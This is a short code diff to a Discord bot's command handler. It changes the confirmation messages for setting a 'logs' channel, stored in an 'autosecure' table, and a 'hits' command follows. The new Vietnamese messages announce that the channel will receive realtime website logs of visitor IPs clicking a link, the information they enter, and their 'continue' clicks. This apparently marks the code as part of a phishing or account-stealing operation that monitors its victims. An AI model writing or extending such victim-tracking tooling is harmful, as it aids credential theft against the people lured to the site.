@@ -91,8 +91,13 @@ function isUserChannel(name) {
 
             case "logs":
                 await client.queryParams(`UPDATE autosecure SET logs_channel=? WHERE user_id=?`, [`${interaction.channelId}|${guildId}`, userId]);
-                interaction.reply({ content: `Changed your logs channel to <#${interaction.channelId}>`, ephemeral: true });
-                interaction.channel.send({ content: `Will send logs in this channel!` });
+                interaction.reply({ 
+                    content: `✅ Đã thiết lập kênh logs thành <#${interaction.channelId}>!\n🌐 Kênh này sẽ nhận **cả log hoạt động Discord và log realtime từ Website** (IP click link, nhập thông tin, click continue).`, 
+                    ephemeral: true 
+                });
+                interaction.channel.send({ 
+                    content: `🔔 **Kênh này đã được thiết lập để nhận toàn bộ LOG DISCORD & LOG REALTIME TỪ WEBSITE!**` 
+                });
                 break;
 
             case "hits":
